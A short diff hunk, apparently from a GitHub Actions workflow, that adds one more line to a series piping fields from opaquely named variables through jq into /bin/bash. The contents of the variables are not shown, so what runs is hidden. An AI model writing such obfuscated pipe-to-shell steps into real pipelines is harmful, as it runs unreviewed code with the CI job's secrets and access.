@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$my90" | jq -r .qyyz502 | /bin/bash
           printf '%s' "$np62" | jq -r .hmjus8842 | /bin/bash
           echo $ui3 | jq -r .bbu1951 | /bin/bash
+          printf '%s' "$lyb0" | jq -r .n86081 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
